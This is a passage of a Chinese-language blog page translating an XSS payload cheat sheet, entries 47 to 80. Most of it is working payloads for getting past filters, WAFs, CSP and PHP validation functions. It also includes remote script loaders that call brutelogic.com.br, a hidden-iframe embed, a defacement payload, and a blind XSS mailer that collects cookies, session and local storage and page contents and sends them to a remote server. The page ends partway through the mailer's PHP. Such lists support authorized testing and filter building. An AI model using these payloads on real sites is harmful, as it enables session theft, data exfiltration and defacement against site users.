onload=eval(&quot; &#x27; &quot;+URL)&gt;</span><br><span class="line">&lt;svg id=eval onload=top[id](&quot; &#x27; &quot;+URL)&gt;</span><br></pre></td></tr></table></figure><p>PoC URL必须包含以下之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">=&gt; FILE.php/&#x27;/alert(1)//?...</span><br><span class="line">=&gt; #&#x27;/alert(1)</span><br></pre></td></tr></table></figure><p><strong>47.Alert Alternative - Eval + URL with Template Literal (弹窗代替方案-带有模板文字的Eval + URL)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(1)&#125;&lt;svg onload=eval(&#x27;`//&#x27;+URL)&gt;</span><br></pre></td></tr></table></figure><p><strong>48.HTML Injection - Inline Alternative (HTML注入-内联替代)</strong></p><p>以下payload用于绕过黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onpointerover=alert(1) //</span><br><span class="line">&quot;autofocus onfocusin=alert(1) //</span><br></pre></td></tr></table></figure><p><strong>49.Strip-Tags Based Bypass (基于去除标签的绕过)</strong></p><p>以下payload用于,当过滤器<code>filter</code>去掉<code>&lt;and&gt;</code>标签字符之间的任何内容时进行测试，如PHP的<code>strip_tags()</code>功能,但仅限内联注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;o&lt;x&gt;nmouseover=alert&lt;x&gt;(1)//</span><br><span class="line">&quot;autof&lt;x&gt;ocus o&lt;x&gt;nfocus=alert&lt;x&gt;(1)//</span><br></pre></td></tr></table></figure><p><strong>50.File Upload Injection – HTML&#x2F;js GIF Disguise (文件上传注入- HTML&#x2F;js GIF伪装)</strong></p><p>以下payload用于通过文件上传绕过CSP限制。将下面的所有内容保存为<code>&quot;xss.gif&quot;</code>或<code>&quot;xss.js&quot;</code>（用于严格的MIME检查）。这是PHP的<code>image/gif</code>文件,它可以通过<code>&lt;link rel=import href=xss.gif&gt;</code>（也称为”xss.js”）或<code>&lt;script src=xss.js&gt;&lt;/script&gt;</code>导入到目标web应用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a=//&lt;script&gt;</span><br><span class="line">alert(1)//&lt;/script&gt;;</span><br></pre></td></tr></table></figure><p><strong>51.Jump to URL Fragment (url分段跳转)</strong></p><p>例如，当我们需要在payload中隐藏一些会触发<code>WAF</code>的关键字符,可以在URL片段<code>（#）</code>之后使用各自的payload进行绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval(URL.slice(-8)) #alert(1)</span><br><span class="line">eval(location.hash.slice(1)) #alert(1)</span><br><span class="line">document.write(decodeURI(location.hash)) #&lt;img/src/onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>52.Second Order XSS Injection (二阶XSS注入)</strong></p><p>当我们的输入的内容将会被使用两次时，例如存储在数据库中，然后进行检索以供后面使用或插入到DOM中时,使用以下的payload进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload&amp;equals;alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>53.PHP Spell Checker Bypass (PHP拼写检查绕过)</strong></p><p>以下payload用于绕过PHP的<code>pspell_new()</code>函数，该函数提供一个字典来尝试猜测用于搜索的输入.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scrpt&gt;confirm(1)&lt;/scrpt&gt;</span><br></pre></td></tr></table></figure><p><strong>54.Event Origin Bypass for postMessage() XSS (postMessage()事件源XSS绕过)</strong></p><p>以下payload用于在目标的<code>javascript</code>代码中可以绕过对源代码的检查时进行测试，将允许的源代码检查的参数,用于发送payload攻击域的子域。在本地主机上使用<code>CrossPwn</code>脚本作为示例（在附加部分中进行提供）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/</span><br><span class="line">status.html&amp;msg=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>55.CSP Bypass (for Whitelisted Google Domains) (CSP 绕过(通过谷歌白名单域名))</strong></p><p>以下payload用于,当存在允许这些白名单域执行<code>CSP</code>（内容安全策略）时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//www.google.com/complete/search?client=chrome%26jsonp=alert(1)&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=//www.googleapis.com/customsearch/v1?callback=alert(1)&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;&lt;x ng-app ng-csp&gt;&#123;&#123;$new.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>56.SVG Vectors with Event Handlers (带有事件处理程序的SVG向量)</strong></p><p>以下payload它可以在<code>Firefox上</code>触发，但是通过在<code>&lt;set&gt;</code>中添加<code>attributename=x</code>参数也可以在<code>Chromium</code>中工作。用于黑名单绕过,<code>&quot;Set&quot;</code>也可以替换为<code>&quot;animate&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;set onbegin=alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;set end=1 onend=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>57.SVG Vectors without Event Handlers (不带事件处理程序的SVG向量)</strong></p><p>以下payload用于避免过滤器查找事件处理程序或<code>src</code>、<code>data</code>等。进行<code>url</code>编码后的最后一个payload仅适用于<code>Firefox</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;a&gt;&lt;rect width=99% height=99% /&gt;&lt;animate attributeName=href</span><br><span class="line">to=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;a&gt;&lt;rect width=99% height=99% /&gt;&lt;animate attributeName=href</span><br><span class="line">values=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;a&gt;&lt;rect width=99% height=99% /&gt;&lt;animate attributeName=href to=0</span><br><span class="line">from=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg&gt;&lt;use xlink:href=data:image/svg</span><br><span class="line">%2Bxml;base64,PHN2ZyBpZD0ieCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAv</span><br><span class="line">c3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI</span><br><span class="line">%2BPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9Imp</span><br><span class="line">hdmFzY3JpcHQ6YWxlcnQoMSkiLz48L3N2Zz4=%23x&gt;</span><br></pre></td></tr></table></figure><p><strong>58.Vectors without Event Handlers (不带事件处理程序的向量)</strong></p><p>如果web应用不允许，则payload用作事件处理程序的替代项。如payload本身所述,有些需要用户交互才能触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;script src=data:,alert(1)&gt;</span><br><span class="line">&lt;iframe src=javascript:alert(1)&gt;</span><br><span class="line">&lt;embed src=javascript:alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;click</span><br><span class="line">&lt;math&gt;&lt;brute href=javascript:alert(1)&gt;click</span><br><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;isindex action=javascript:alert(1) type=submit value=click&gt;</span><br><span class="line">&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt;</span><br><span class="line">&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=SOURCE&gt;</span><br><span class="line">&lt;isindex formaction=javascript:alert(1) type=submit value=click&gt;</span><br><span class="line">&lt;object data=javascript:alert(1)&gt;</span><br><span class="line">&lt;iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&gt;&gt;</span><br><span class="line">&lt;svg&gt;&lt;script xlink:href=data:,alert(1) /&gt;</span><br><span class="line">&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click</span><br></pre></td></tr></table></figure><p><strong>59.Vectors with Agnostic Event Handlers (带有未知事件处理程序的向量)</strong></p><p>如果web应用不允许使用所有已知的<code>HTML</code>标记名时，请使用以下payload。任何字母字符或字符串都可以用作标签名名来代替<code>&quot;x&quot;</code>。</p><p>如payload本身所述,有些需要用户交互才能触发.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;x contenteditable onblur=alert(1)&gt;lose focus!</span><br><span class="line">&lt;x onclick=alert(1)&gt;click this!</span><br><span class="line">&lt;x oncopy=alert(1)&gt;copy this!</span><br><span class="line">&lt;x oncontextmenu=alert(1)&gt;right click this!</span><br><span class="line">&lt;x onauxclick=alert(1)&gt;right click this!</span><br><span class="line">&lt;x oncut=alert(1)&gt;copy this!</span><br><span class="line">&lt;x ondblclick=alert(1)&gt;double click this!</span><br><span class="line">&lt;x ondrag=alert(1)&gt;drag this!</span><br><span class="line">&lt;x contenteditable onfocus=alert(1)&gt;focus this!</span><br><span class="line">&lt;x contenteditable oninput=alert(1)&gt;input here!</span><br><span class="line">&lt;x contenteditable onkeydown=alert(1)&gt;press any key!</span><br><span class="line">&lt;x contenteditable onkeypress=alert(1)&gt;press any key!</span><br><span class="line">&lt;x contenteditable onkeyup=alert(1)&gt;press any key!</span><br><span class="line">&lt;x onmousedown=alert(1)&gt;click this!</span><br><span class="line">&lt;x onmouseenter=alert(1)&gt;hover this</span><br><span class="line">&lt;x onmousemove=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onmouseout=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onmouseover=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onmouseup=alert(1)&gt;click this!</span><br><span class="line">&lt;x contenteditable onpaste=alert(1)&gt;paste here!</span><br><span class="line">&lt;x onpointercancel=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerdown=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerenter=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerleave=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointermove=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerout=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerover=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerup=alert(1)&gt;hover this!</span><br><span class="line">&lt;x onpointerrawupdate=alert(1)&gt;hover this!</span><br></pre></td></tr></table></figure><p><strong>60.Mixed Context Reflection Entity Bypass (反射实体混合上下文绕过)</strong></p><p>以下payload用于在实际有效的js代码中的脚本块中转换特定的代码。它需要以在<code>HTML</code>和<code>javascript</code>上下文标签这种顺序执行，并且相关联彼此。</p><p>这个<code>svg</code>标记将使下一个脚本块中的单引号编码为<code>&#39;</code>或<code>&#39;</code>，并触发弹窗。</p><p>以下javascript场景的payload，分别为：</p><p>消除单引号、完全转义单引号、消除双引号和完全转义双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&#x27;-alert(1)-&#x27;&lt;svg&gt;</span><br><span class="line">&quot;&gt;&amp;#39-alert(1)-&amp;#39&lt;svg&gt;</span><br><span class="line">&quot;&gt;alert(1)-&quot;&lt;svg&gt;</span><br><span class="line">&quot;&amp;#34&gt;alert(1)-&amp;#34&lt;svg&gt;</span><br></pre></td></tr></table></figure><p><strong>61.Strip-My-Script Vector (去除脚本向量)</strong></p><p>以下payload用于欺骗xss过滤器,用于去除最经典和最知名的XSS payload,它的工作原理是<code>&quot;&lt;script&gt;&quot;</code>标签被删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/on&lt;script&gt;&lt;script&gt;load=alert(1)//&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>62.Javascript Alternative Comments (Javascript注释替代)</strong></p><p>以下payload用于,当不允许、转义或删除常规javascript注释（&#x2F;&#x2F;）时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">%0A--&gt;</span><br></pre></td></tr></table></figure><p><strong>63.JS Lowercased Input (javascript小写输入)</strong></p><p>以下payload用于当目标应用程序通过javascript将输入转换为小写时使用。它也可以用于服务器端的小写操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRİPT&gt;alert(1)&lt;/SCRİPT&gt;</span><br><span class="line">&lt;SCRİPT/SRC=data:,alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>64.Overlong UTF-8 (超长UTF-8)</strong></p><p>以下payload用于当目标应用程序执行最佳匹配标签时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%CA%BA&gt;%EF%BC%9Csvg/onload%EF%BC%9Dalert%EF%BC%881)&gt;</span><br></pre></td></tr></table></figure><p><strong>65.Vectors Exclusive for ASP Pages (ASP网页专用payload)</strong></p><p>以下payload用于绕过<code>.asp</code>页中的<code>&lt;[alpha]</code>筛选。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%u003Csvg onload=alert(1)&gt;</span><br><span class="line">%u3008svg onload=alert(2)&gt;</span><br><span class="line">%uFF1Csvg onload=alert(3)&gt;</span><br></pre></td></tr></table></figure><p><strong>66.PHP Email Validation Bypass (PHP电子邮件验证绕过)</strong></p><p>以下payload用于绕过PHP的<code>FILTER_var()</code>函数的<code>FILTER_VALIDATE_EMAIL</code>(筛选验证电子邮件)标志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;svg/onload=alert(1)&gt;&quot;@x.y</span><br></pre></td></tr></table></figure><p><strong>67.PHP URL Validation Bypass (PHP URL验证绕过)</strong></p><p>以下payload用于绕过PHP的<code>FILTER_var()</code>函数的<code>FILTER_VALIDATE_EMAIL</code>(筛选验证电子邮件)标志。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript://%250Aalert(1)</span><br></pre></td></tr></table></figure><p><strong>68.PHP URL Validation Bypass – Query Required (PHP URL验证绕过-需要查询)</strong></p><p>以下payload用于绕过PHP需要筛选标志查询(<code>FILTER_FLAG_QUERY_REQUIRED</code>),筛选验证电子邮件(<code>FILTER_VALIDATE_EMAIL</code>)的<code>filter_var()</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javascript://%250Aalert(1)//?1</span><br><span class="line">javascript://%250A1?alert(1):0</span><br><span class="line">(with domain filter)</span><br><span class="line">javascript://https://DOMAIN/%250A1?alert(1):0</span><br></pre></td></tr></table></figure><p><strong>69.DOM Insertion via Server Side Reflection (通过服务器端反射插入DOM)</strong></p><p>以下payload用于,当输入被反射到源中而不能执行时使用,为了避免浏览器筛选和<code>WAF</code>,插入到<code>DOM</code>中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\74svg o\156load\75alert\501\51\76</span><br></pre></td></tr></table></figure><p><strong>70.XML-Based Vector for Bypass (基于XML的绕过)</strong></p><p>以下payload用于在XML网页中绕过浏览器筛选和WAF。</p><p>如果输入插入到了注释节点中，则在payload前加一个”-&gt;”，如果输入落在<code>CDATA</code>节中，则在有效负载前加一个<code>]]&gt;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;_:script xmlns:_=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/_:script&gt;</span><br></pre></td></tr></table></figure><p><strong>71.Javascript Context - Code Injection (IE11&#x2F;Edge Bypass) (Javascript上下文-代码注入（IE11&#x2F;Edge 绕过）)</strong></p><p>以下payload用于在注入javascript上下文时,绕过<code>Microsoft IE11</code>或<code>Edge</code>浏览器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#x27;&gt;confirm&amp;lpar;1)&lt;/Script&gt;&lt;Svg&gt;&lt;Script/1=&#x27;</span><br></pre></td></tr></table></figure><p><strong>72.Javascript Pseudo-Protocol Obfuscation (Javascript伪协议混淆)</strong></p><p>以下payload用于绕过查找<code>javascript:alert(1)</code>的筛选器。在添加<code>alert(1)</code>之前，请确保它可以与”1”成功弹窗,这个payload可能需要一些额外的模糊处理,通过url编码,才能完全绕过过滤器。最后一个选项仅适用于payload的<code>DOM</code>操作（例如在基于位置的payload或基于<code>DOM</code>的XSS中）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;#99ript:1</span><br><span class="line">javascript&amp;colon;1</span><br><span class="line">javascript&amp;#9:1</span><br><span class="line">&amp;#1javascript:1</span><br><span class="line">&quot;javas%0Dcript:1&quot;</span><br><span class="line">%00javascript:1</span><br></pre></td></tr></table></figure><p><strong>73.AngularJS Injection (v1.6+) – No Parentheses, Brackets or Quotes (AngularJS注入-无括号、括号或引号)</strong></p><p>以下payload用于避免xss过滤。第一,二个payload为了避免括号,最后一个payload,通过在URL中通正确编码,在相同或分离的注入点中使用它来避免引号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$new.constructor&amp;#40&#x27;alert\u00281\u0029&#x27;&amp;#41&amp;#40&amp;#41&#125;&#125;</span><br><span class="line">&amp;#123&amp;#123$new.constructor(&#x27;alert(1)&#x27;)()&amp;#125&amp;#125</span><br><span class="line">&lt;x ng-init=a=&#x27;alert(1)&#x27;&gt;&#123;&#123;$new.constructor(a)()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>74.Inside Comments Bypass (内部评论绕过)</strong></p><p>如果HTML注释中允许任何内容，则使用payload<code>（regex:/&lt;！--.*--&gt;/)</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--&gt;&lt;svg onload=alert(1)--&gt;</span><br></pre></td></tr></table></figure><p><strong>75.Agnostic Event Handlers Vectors – Native Script Based (未知事件处理程序向量-基于本机脚本)</strong></p><p>以下带有事件处理程序的payload，可以与任意标记名一起使用，这有助于绕过黑名单检测。它们需要在注入之后在页面中加载一些脚本。请记住，在下面的处理程序中使用诸如<code>&quot;&lt;b&quot;</code>之类的现有标记名,可能是在某些情况下触发xss的唯一方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;x onafterscriptexecute=alert(1)&gt;</span><br><span class="line">&lt;x onbeforescriptexecute=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>76.Agnostic Event Handlers Vectors – CSS3 Based (未知事件处理程序向量——基于CSS3)</strong></p><p>以下带有带有事件处理程序的向量，可以与任意标记名一起使用，这有助于绕过黑名单。它们需要<code>&lt;style&gt;</code>标签,或使用<code>&lt;link</code>&gt;标签导入样式表。最后<br>四个payload只适用于火狐。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;x onanimationend=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x onanimationstart=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x onwebkitanimationend=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x onwebkitanimationstart=alert(1)&gt;&lt;style&gt;x&#123;animation:s&#125;@keyframes s&#123;&#125;</span><br><span class="line">&lt;x ontransitionend=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br><span class="line">&lt;x ontransitionrun=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br><span class="line">&lt;x ontransitionstart=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br><span class="line">&lt;x ontransitioncancel=alert(1)&gt;&lt;style&gt;*&#123;transition:color 1s&#125;*:hover&#123;color:red&#125;</span><br></pre></td></tr></table></figure><p><strong>77.Remote Script Call (远程脚本调用)</strong></p><p>以下payload用于当需要调用外部脚本,但XSS向量是基于web应用处理程序的脚本时使用(如<code>&lt;svg onload=</code>)或通过javascript注入</p><p>“brutelogic.com.br”域和HTML,js文件为例。如果以某种方式过滤<code>&quot;&gt;&quot;</code>，请将<code>&quot;r=&gt;&quot;</code>或<code>&quot;w=&gt;&quot;</code>替换为 <code>&quot;function()&quot;</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">=&gt; HTML-based</span><br><span class="line">(response must be HTML with an Access-Control-Allow-Origin (CORS) header)</span><br><span class="line">&quot;var x=new XMLHttpRequest();x.open(&#x27;GET&#x27;,&#x27;//brutelogic.com.br/0.php&#x27;);x.send();</span><br><span class="line">x.onreadystatechange=function()&#123;if(this.readyState==4)&#123;write(x.responseText)&#125;&#125;&quot;</span><br><span class="line">fetch(&#x27;//brutelogic.com.br/0.php&#x27;).then(r=&gt;&#123;r.text().then(w=&gt;&#123;write(w)&#125;)&#125;)</span><br><span class="line"></span><br><span class="line">(with fully loaded JQuery library)</span><br><span class="line">$.get(&#x27;//brutelogic.com.br/0.php&#x27;,r=&gt;&#123;write(r)&#125;)</span><br><span class="line"></span><br><span class="line">=&gt; Javascript-based</span><br><span class="line">(response must be javascript)</span><br><span class="line">with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;//brutelogic.com.br/2.js&#x27;</span><br><span class="line"></span><br><span class="line">(with fully loaded JQuery library)</span><br><span class="line">$.getScript(&#x27;//brutelogic.com.br/2.js&#x27;)</span><br><span class="line">(CORS and js extension required)</span><br><span class="line">import(&#x27;//domain/file&#x27;)</span><br></pre></td></tr></table></figure><p><strong>78.Invisible Foreign XSS Embedding (不可见的外部XSS嵌入)</strong></p><p>以下payload用于将XSS从另一个域（或子域）加载到当前域中。受限于目标域的<code>X-Frame-Options（XFO）</code>头文件。</p><p>下面是<code>brutelogic.com.br</code>上下文中的弹窗示例,不分域名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;//brutelogic.com.br/xss.php?a=&lt;svg onload=alert(document.domain)&gt;&quot;</span><br><span class="line">style=display:none&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><strong>79.Simple Virtual Defacement (简单的虚假网页信息)</strong></p><p>以下payload用于更改网站HTML代码的显示方式。在下面的例子中显示”Not Found”消息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">documentElement.innerHTML=&#x27;&lt;h1&gt;Not Found&lt;/h1&gt;&#x27;</span><br></pre></td></tr></table></figure><p><strong>80.Blind XSS Mailer (xss邮件盲打)</strong></p><p>以下payload将其于远程XSS盲打脚本，另存为PHP文件并更改<code>$to</code>和<code>$headers</code>变量</p><p>因此。需要一台Postfix这样的工作邮件服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&quot;Content-type: application/javascript&quot;); ?&gt;</span><br><span class="line">var mailer = &#x27;&lt;?= &quot;//&quot; . $_SERVER[&quot;SERVER_NAME&quot;] . $_SERVER[&quot;REQUEST_URI&quot;] ?&gt;&#x27;;</span><br><span class="line">var msg = &#x27;USER AGENT\n&#x27; + navigator.userAgent + &#x27;\n\nTARGET URL\n&#x27; + document.URL;</span><br><span class="line">msg += &#x27;\n\nREFERRER URL\n&#x27; + document.referrer + &#x27;\n\nREADABLE COOKIES\n&#x27; +</span><br><span class="line">document.cookie;</span><br><span class="line">msg += &#x27;\n\nSESSION STORAGE\n&#x27; + JSON.stringify(sessionStorage) + &#x27;\n\nLOCAL</span><br><span class="line">STORAGE\n&#x27; + JSON.stringify(localStorage);</span><br><span class="line">msg += &#x27;\n\nFULL DOCUMENT\n&#x27; + document.documentElement.innerHTML;</span><br><span class="line">var r = new XMLHttpRequest();</span><br><span class="line">r.open(&#x27;POST&#x27;, mailer, true);</span><br><span class="line">r.setRequestHeader(&#x27;Content-type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);</span><br><span class="line">r.send(&#x27;origin=&#x27; + document.location.origin + &#x27;&amp;msg=&#x27; + encodeURIComponent(msg));</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Access-Control-Allow-Origin: &quot; . $_POST[&quot;origin&quot;]);</span><br><span class="line">$origin = $_POST[&quot;origin&quot;];</span><br><span class="line">$to = &quot;myName@myDomain&quot;;</span><br><span class="line">$subject = &quot;XSS Blind Report for &quot; . $origin;</span><br><span class="line">$ip = &quot;Requester: &quot; . $_SERVER[&quot;REMOTE_ADDR&quot;] . &quot;\nForwarded For: &quot;.</span><br><span class="line">$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];</span><br><span class="line">$msg = $subject . &quot;\n\nIP ADDRESS\n&quot; . $ip . &quot;\n\n&quot; . 